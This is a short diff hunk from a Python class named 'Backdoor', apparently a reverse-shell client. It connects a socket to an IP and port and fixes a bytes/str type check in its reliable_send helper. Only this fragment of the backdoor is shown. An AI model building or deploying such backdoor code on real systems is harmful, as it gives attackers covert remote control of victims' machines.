@@ -10,7 +10,7 @@ class Backdoor:
         self.connection.connect((ip, port))
 
     def reliable_send(self, data):
-        if isinstance(data,str):
+        if isinstance(data,bytes):
             json_data = json.dumps(data.decode("utf-8"))
         else:
             json_data = json.dumps(data)
